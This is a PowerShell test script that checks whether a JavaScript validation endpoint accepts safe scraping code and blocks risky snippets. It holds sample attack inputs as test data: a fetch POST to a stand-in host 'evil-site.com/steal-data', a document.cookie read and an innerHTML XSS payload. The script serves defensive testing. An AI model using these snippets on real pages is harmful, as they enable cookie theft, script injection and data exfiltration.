# Test Security Validation with Gnosis Wraith
# This script tests the security features and code validation

# Load helper functions
. "$env:USERPROFILE\.gnosis-wraith\GnosisHelper.ps1"

Write-Host "`nGnosis Wraith Security Validation Tests" -ForegroundColor Cyan
Write-Host "=======================================" -ForegroundColor Cyan

# Test 1: Validate Safe Code
Write-Host "`n1. Validate Safe JavaScript Code" -ForegroundColor Yellow
$result = Invoke-GnosisApi -Endpoint "/api/v2/validate" -Body @{
    javascript = @"
// Safe code that should pass validation
const links = document.querySelectorAll('a');
return Array.from(links).map(link => ({
    text: link.textContent,
    href: link.href
}));
"@
}

if ($result.valid -eq $true) {
    Write-Host "✓ Safe code validated successfully!" -ForegroundColor Green
    Write-Host "  Validation passed: $($result.message)" -ForegroundColor Gray
} else {
    Write-Host "✗ Safe code failed validation: $($result.message)" -ForegroundColor Red
}

# Test 2: Block eval() usage
Write-Host "`n2. Block Dangerous eval() Usage" -ForegroundColor Yellow
$result = Invoke-GnosisApi -Endpoint "/api/v2/validate" -Body @{
    javascript = "eval('alert(1)');"
}

if ($result.valid -eq $false) {
    Write-Host "✓ Dangerous code blocked successfully!" -ForegroundColor Green
    Write-Host "  Reason: $($result.message)" -ForegroundColor Gray
} else {
    Write-Host "✗ Dangerous code was not blocked!" -ForegroundColor Red
}

# Test 3: Block innerHTML manipulation
Write-Host "`n3. Block innerHTML Manipulation" -ForegroundColor Yellow
$result = Invoke-GnosisApi -Endpoint "/api/v2/validate" -Body @{
    javascript = @"
document.body.innerHTML = '<script>alert("XSS")</script>';
"@
}

if ($result.valid -eq $false) {
    Write-Host "✓ innerHTML manipulation blocked!" -ForegroundColor Green
    Write-Host "  Reason: $($result.message)" -ForegroundColor Gray
} else {
    Write-Host "✗ innerHTML manipulation not blocked!" -ForegroundColor Red
}

# Test 4: Block cookie access
Write-Host "`n4. Block Cookie Access" -ForegroundColor Yellow
$result = Invoke-GnosisApi -Endpoint "/api/v2/validate" -Body @{
    javascript = "return document.cookie;"
}

if ($result.valid -eq $false) {
    Write-Host "✓ Cookie access blocked!" -ForegroundColor Green
    Write-Host "  Reason: $($result.message)" -ForegroundColor Gray
} else {
    Write-Host "✗ Cookie access not blocked!" -ForegroundColor Red
}

# Test 5: Block external fetch
Write-Host "`n5. Block External Fetch Requests" -ForegroundColor Yellow
$result = Invoke-GnosisApi -Endpoint "/api/v2/validate" -Body @{
    javascript = @"
fetch('https://evil-site.com/steal-data', {
    method: 'POST',
    body: JSON.stringify({data: document.title})
});
"@
}

if ($result.valid -eq $false) {
    Write-Host "✓ External fetch blocked!" -ForegroundColor Green
    Write-Host "  Reason: $($result.message)" -ForegroundColor Gray
} else {
    Write-Host "✗ External fetch not blocked!" -ForegroundColor Red
}

# Test 6: Block localStorage access
Write-Host "`n6. Block localStorage Access" -ForegroundColor Yellow
$result = Invoke-GnosisApi -Endpoint "/api/v2/validate" -Body @{
    javascript = "localStorage.setItem('stolen', 'data');"
}

if ($result.valid -eq $false) {
    Write-Host "✓ localStorage access blocked!" -ForegroundColor Green
    Write-Host "  Reason: $($result.message)" -ForegroundColor Gray
} else {
    Write-Host "✗ localStorage access not blocked!" -ForegroundColor Red
}

# Test 7: Test complex safe code
Write-Host "`n7. Validate Complex Safe Code" -ForegroundColor Yellow
$result = Invoke-GnosisApi -Endpoint "/api/v2/validate" -Body @{
    javascript = @"
// Complex but safe data extraction
const products = Array.from(document.querySelectorAll('.product-item'));
const data = products.map(product => {
    const name = product.querySelector('.product-name')?.textContent || '';
    const price = product.querySelector('.price')?.textContent || '';
    const rating = product.querySelectorAll('.star.active').length;
    
    return {
        name: name.trim(),
        price: price.replace(/[^0-9.]/g, ''),
        rating: rating,
        available: !product.classList.contains('out-of-stock')
    };
});

// Filter and sort
const inStock = data.filter(p => p.available);
inStock.sort((a, b) => b.rating - a.rating);

return {
    total: products.length,
    inStock: inStock.length,
    topRated: inStock.slice(0, 5)
};
"@
}

if ($result.valid -eq $true) {
    Write-Host "✓ Complex safe code validated!" -ForegroundColor Green
    Write-Host "  This code can safely extract and process data" -ForegroundColor Gray
} else {
    Write-Host "✗ Complex code failed validation: $($result.message)" -ForegroundColor Red
}

# Test 8: Test setTimeout/setInterval blocking
Write-Host "`n8. Block setTimeout/setInterval" -ForegroundColor Yellow
$result = Invoke-GnosisApi -Endpoint "/api/v2/validate" -Body @{
    javascript = @"
setTimeout(() => {
    console.log('This should be blocked');
}, 1000);
"@
}

if ($result.valid -eq $false) {
    Write-Host "✓ Timer functions blocked!" -ForegroundColor Green
    Write-Host "  Reason: $($result.message)" -ForegroundColor Gray
} else {
    Write-Host "✗ Timer functions not blocked!" -ForegroundColor Red
}

# Summary
Write-Host "`n" -NoNewline
Write-Host "Security Validation Summary" -ForegroundColor Cyan
Write-Host "===========================" -ForegroundColor Cyan
Write-Host "The security validation system should block:" -ForegroundColor Yellow
Write-Host "  • eval() and Function() constructor" -ForegroundColor Gray
Write-Host "  • innerHTML and outerHTML manipulation" -ForegroundColor Gray
Write-Host "  • document.cookie access" -ForegroundColor Gray
Write-Host "  • fetch() and XMLHttpRequest" -ForegroundColor Gray
Write-Host "  • localStorage and sessionStorage" -ForegroundColor Gray
Write-Host "  • setTimeout and setInterval" -ForegroundColor Gray
Write-Host "  • Any attempts to modify the DOM dangerously" -ForegroundColor Gray

Write-Host "`nSecurity validation tests completed!" -ForegroundColor Cyan